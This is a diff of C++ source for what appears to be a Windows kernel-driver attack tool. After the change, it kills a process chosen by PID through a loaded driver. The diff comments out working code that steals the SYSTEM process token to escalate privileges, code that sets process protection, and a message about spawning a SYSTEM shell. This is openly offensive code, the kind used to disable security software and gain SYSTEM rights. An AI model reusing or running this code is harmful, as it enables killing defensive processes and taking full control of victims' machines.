@@ -227,71 +227,70 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 	ULONG nPid = atoi(argv[1]);
 
-	ULONG64 SystemProcess{ 0 };
-	ULONG64 CurrentProcess{ 0 };
-
-	
-	BOOLEAN bResult{ FALSE };
-	NTSTATUS status = Utils::RtlAdjustPrivilege(20, TRUE, FALSE, &bResult);
-	if (!NT_SUCCESS(status))
-	{
-		LOG("[-] Failed to adjust privilege. Error code: 0x" << std::hex << status << " line = " << __LINE__);
-		return 1;
-	}
-
-	auto nResult = GetObjectPointer(&SystemProcess, 4, ULongToHandle(4));
-	if (nResult != 0 || SystemProcess == 0)
-	{
-		LOG("[-] GetObjectPtr failed for system process with error code: " << nResult);
-		return nResult;
-	}
-
-	auto hCurrentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
-	if (!hCurrentProcess)
-	{
-		LOG("[-] OpenProcess failed for current process with error code: " << GetLastError());
-	}
-	nResult = GetObjectPointer(&CurrentProcess, GetCurrentProcessId(), hCurrentProcess);
-	if (nResult != 0 || CurrentProcess == 0)
-	{
-		LOG("[-] GetObjectPtr failed for current process with error code: " << nResult);
-		return nResult;
-	}
-	/*else
-	{
-		LOG("[+] Current Process EPROCESS address: 0x" << std::hex << CurrentProcess << std::dec);
-	}*/
-
-	auto initResult = DriverWorker::InitializeDriver();
-	if (!initResult)
-	{
-		LOG("[-] Failed to initialize driver");
-		return 1;
-	}
-
-	SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
-
-	DriverLoader::PrivilegeEscalation(SystemProcess, CurrentProcess, EPROCESS_TOKEN_OFFSET);
-	
-	SetConsoleTextAttribute(hConsole, 7);
-
-	//DriverLoader::PS_PROTECTION protection{};
-	////protection.Level = 0x01; // Protected Light
-	//protection.Type		= DriverLoader::PsProtectedTypeProtected;
-	//protection.Signer	= DriverLoader::PsProtectedSignerWinSystem;
-
-	//DriverLoader::SetProcessProtection(CurrentProcess, ProtectionOffset, &protection);
-
-	/*MessageBoxA(nullptr,
-				"If you see this message box, the process is still alive. Click OK to spawn a SYSTEM shell.",
-				"Process Status",
-				MB_OK);*/
-	
-	DriverWorker::UninitializeDriver();
-
-
-	Sleep(10000);
+	//Sleep(10000);
 	DriverWorker::Kill(nPid);
+
+	//ULONG64 SystemProcess{ 0 };
+	//ULONG64 CurrentProcess{ 0 };
+
+	//
+	//BOOLEAN bResult{ FALSE };
+	//NTSTATUS status = Utils::RtlAdjustPrivilege(20, TRUE, FALSE, &bResult);
+	//if (!NT_SUCCESS(status))
+	//{
+	//	LOG("[-] Failed to adjust privilege. Error code: 0x" << std::hex << status << " line = " << __LINE__);
+	//	return 1;
+	//}
+
+	//auto nResult = GetObjectPointer(&SystemProcess, 4, ULongToHandle(4));
+	//if (nResult != 0 || SystemProcess == 0)
+	//{
+	//	LOG("[-] GetObjectPtr failed for system process with error code: " << nResult);
+	//	return nResult;
+	//}
+
+	//auto hCurrentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+	//if (!hCurrentProcess)
+	//{
+	//	LOG("[-] OpenProcess failed for current process with error code: " << GetLastError());
+	//}
+	//nResult = GetObjectPointer(&CurrentProcess, GetCurrentProcessId(), hCurrentProcess);
+	//if (nResult != 0 || CurrentProcess == 0)
+	//{
+	//	LOG("[-] GetObjectPtr failed for current process with error code: " << nResult);
+	//	return nResult;
+	//}
+
+
+	//auto initResult = DriverWorker::InitializeDriver();
+	//if (!initResult)
+	//{
+	//	LOG("[-] Failed to initialize driver");
+	//	return 1;
+	//}
+
+	//SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
+
+	//DriverLoader::PrivilegeEscalation(SystemProcess, CurrentProcess, EPROCESS_TOKEN_OFFSET);
+	//
+	//SetConsoleTextAttribute(hConsole, 7);
+
+	////DriverLoader::PS_PROTECTION protection{};
+	//////protection.Level = 0x01; // Protected Light
+	////protection.Type		= DriverLoader::PsProtectedTypeProtected;
+	////protection.Signer	= DriverLoader::PsProtectedSignerWinSystem;
+
+	////DriverLoader::SetProcessProtection(CurrentProcess, ProtectionOffset, &protection);
+
+	// MessageBoxA(nullptr,
+	//			"If you see this message box, the process is still alive. Click OK to spawn a SYSTEM shell.",
+	//			"Process Status",
+	//			MB_OK);
+	//
+	//DriverWorker::UninitializeDriver();
+
+
+	
 
 
 	system("pause");
